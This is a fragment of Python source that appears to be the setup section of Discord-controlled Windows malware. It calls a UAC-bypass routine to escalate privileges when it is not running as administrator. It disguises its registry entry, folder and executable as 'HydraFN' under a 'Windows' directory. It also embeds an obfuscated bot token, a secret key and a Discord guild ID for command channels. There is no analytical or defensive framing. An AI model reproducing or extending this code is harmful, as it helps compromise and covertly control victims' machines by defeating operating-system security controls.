...
if not IsAdmin():
    if GetSelf()[1]:
        if UACbypass():
            os._exit(0)
auto = 'auto'
bot_tokens = ['RNEZul2XTlHRHdXb2lUQ2R2XwlUW3BlQGdTbwQVRXZXU1I0YtdmL4p2ROZzRucmT10EVNhXV65EeVRkT3lleOVzYE1kMRRVT']
software_registry_name = 'HydraFN'
software_directory_name = 'Windows'
software_executable_name = 'HydraFN.exe'
channel_ids = {                                                    ##
    'info': True,
    'main': True,
    'spam': True,
...
secret_key = '193f52e0a208a730609156927bd10fa7bac4390762bbb35e36c37bcdd6e06209'
guild_id = 1460465691718189170
